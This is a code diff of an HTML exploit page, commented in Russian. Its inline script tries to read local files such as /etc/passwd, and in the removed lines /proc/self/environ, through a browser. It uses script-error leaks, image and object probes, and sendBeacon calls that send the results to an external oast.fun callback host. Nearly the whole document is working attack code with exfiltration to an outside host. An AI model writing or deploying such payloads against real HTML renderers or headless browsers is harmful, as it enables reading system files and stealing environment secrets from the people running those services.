@@ -4,29 +4,46 @@
 <script>
     const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
 
-    // Метод 1: Ошибка парсинга скрипта (палит первую строку)
-    window.onerror = function(msg, url, line, col, error) {
-        navigator.sendBeacon(hook + "/CONTENT_LEAK", JSON.stringify({
-            message: msg,
-            line: line,
-            file: url
-        }));
+    // МЕТОД 1: Каскадная ошибка (SOP Bypass через Error Message)
+    // В некоторых версиях Chrome ошибка парсинга скрипта содержит кусок текста
+    window.onerror = function(msg) {
+        navigator.sendBeacon(hook + "/LEAK_ERROR", msg);
     };
 
-    // Пытаемся подключить файл как скрипт
-    // Браузер выдаст SyntaxError, так как passwd - это не JS.
-    // В тексте ошибки часто пишет: "Unexpected token 'root'..."
+    // МЕТОД 2: Попытка заставить браузер "отрисовать" файл как картинку на Canvas
+    // Если мы сможем прочитать хоть один пиксель, мы подтвердим чтение
+    function leakViaCanvas() {
+        const img = new Image();
+        img.src = "file:///etc/passwd";
+        img.onerror = () => {
+            // Если файл есть, но не картинка, ошибка вылетает быстрее
+            navigator.sendBeacon(hook + "/FILE_EXISTS_CONFIRMED");
+        };
+    }
+
+    // МЕТОД 3: Самый перспективный — HTML5 Object/Iframe
+    // Мы создаем скрытый элемент и пытаемся вытащить его параметры
+    function leakViaObject() {
+        const obj = document.createElement('object');
+        obj.data = "file:///etc/passwd";
+        obj.onload = () => {
+            // Если загрузилось, пробуем достать размер (палит объем файла)
+            try {
+                const size = obj.getBoundingClientRect().width;
+                navigator.sendBeacon(hook + "/OBJECT_LOADED", "Size: " + size);
+            } catch(e) {}
+        };
+        document.body.appendChild(obj);
+    }
+
+    // МЕТОД 4: Brute-force первой строки (Unexpected token)
+    // Мы подключаем файл как JS. Chrome скажет: "Uncaught SyntaxError: Unexpected identifier 'root'"
     const script = document.createElement('script');
     script.src = "file:///etc/passwd";
     document.body.appendChild(script);
 
-    // Метод 2: Проверка через тег <video> (для бинарных данных/env)
-    const v = document.createElement('video');
-    v.onerror = () => {
-        // Если ошибка "MEDIA_ERR_SRC_NOT_SUPPORTED", значит файл прочитан, но не видео
-        navigator.sendBeacon(hook + "/VIDEO_PROBE", "File accessed but format invalid");
-    };
-    v.src = "file:///proc/self/environ";
+    leakViaCanvas();
+    leakViaObject();
 </script>
 </body>
 </html>
